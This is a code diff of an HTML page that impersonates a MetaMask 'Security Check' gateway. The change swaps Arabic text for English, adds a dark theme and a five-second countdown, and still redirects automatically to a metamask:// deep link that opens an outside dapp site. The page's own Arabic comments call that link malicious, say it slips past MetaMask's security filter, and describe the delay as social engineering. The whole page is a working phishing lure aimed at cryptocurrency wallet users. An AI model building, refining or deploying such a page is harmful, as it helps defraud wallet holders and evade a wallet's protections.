@@ -1,66 +1,81 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحقق من أمان المحفظة...</title>
+    <title>Security Check - Redirecting...</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
             margin: 0;
-            background-color: #f4f7f9;
-            color: #333;
+            background-color: #111827; /* Dark theme for professional look */
+            color: #ffffff;
         }
         .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #f6851b; /* لون MetaMask البرتقالي للتمويه */
+            border: 4px solid #374151;
+            border-top: 4px solid #f6851b; /* MetaMask Orange */
             border-radius: 50%;
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .message { margin-top: 25px; font-size: 1.3rem; font-weight: bold; }
-        .sub-message { margin-top: 10px; color: #666; font-size: 0.9rem; }
-        button {
+        .status { margin-top: 25px; font-size: 1.2rem; font-weight: 500; }
+        .timer { margin-top: 10px; color: #9ca3af; font-size: 0.9rem; }
+        #countdown { color: #f6851b; font-weight: bold; }
+        .btn-manual {
             margin-top: 30px;
-            padding: 12px 25px;
-            background-color: #f6851b;
-            color: white;
-            border: none;
-            border-radius: 8px;
+            padding: 10px 20px;
+            background-color: transparent;
+            color: #f6851b;
+            border: 1px solid #f6851b;
+            border-radius: 6px;
             cursor: pointer;
-            font-size: 1rem;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: 0.3s;
         }
+        .btn-manual:hover { background-color: #f6851b; color: white; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <div class="message">جاري الربط مع تطبيق MetaMask...</div>
-    <div class="sub-message">يرجى الموافقة على طلب الفتح إذا ظهر لك.</div>
+    <div class="status">Connecting to MetaMask Secure Gateway...</div>
+    <div class="timer">Automatic redirect in <span id="countdown">5</span> seconds</div>
 
     <script>
-        // الرابط الذي اكتشفنا أنه يتجاوز الفلتر الأمني
+        // الرابط الخبيث (الثغرة)
         const targetUrl = "metamask://browse?url=dapp://hatestck.vercel.app";
+        let seconds = 5;
+        const countdownElement = document.getElementById('countdown');
 
-        // وظيفة التحويل التلقائي
-        function redirectToMetaMask() {
+        // تحديث العداد التنازلي بصرياً
+        const timerInterval = setInterval(() => {
+            seconds--;
+            countdownElement.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(timerInterval);
+                redirectToApp();
+            }
+        }, 1000);
+
+        function redirectToApp() {
             window.location.href = targetUrl;
         }
 
-        // محاولة التحويل بعد 1.5 ثانية لإعطاء طابع رسمي (Social Engineering)
+        // محاولة التحويل التلقائي فوراً كـ Backup
         window.onload = function() {
-            setTimeout(redirectToMetaMask, 1500);
+            // التحويل سيتم بواسطة الـ setInterval أعلاه بعد 5 ثوانٍ
         };
     </script>
 
-    <button onclick="redirectToMetaMask()">اضغط هنا للمتابعة يدوياً</button>
+    <a href="javascript:redirectToApp()" class="btn-manual">Click here if not redirected</a>
 
 </body>
 </html>
